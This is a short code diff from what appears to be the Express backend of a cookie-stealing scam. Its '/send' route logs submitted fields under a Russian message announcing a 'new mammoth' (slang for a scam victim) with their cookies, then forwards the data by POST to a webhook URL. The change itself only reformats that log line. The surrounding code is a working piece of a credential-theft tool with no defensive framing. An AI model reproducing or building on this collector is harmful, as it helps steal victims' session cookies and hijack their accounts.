@@ -29,7 +29,7 @@ app.post('/send', async (req, res) => {
                 console.log(reqBody[key],index);
             }
         }
-        console.log(`Новый мамонт! \n Куки: ${fieldsArray.concat("\n \n")}`);
+        console.log(`Новый мамонт!\nКуки: ${fieldsArray.concat("\n \n")}`);
         const response = await fetch(webhookUrl, {
             method: "POST",
             headers: {
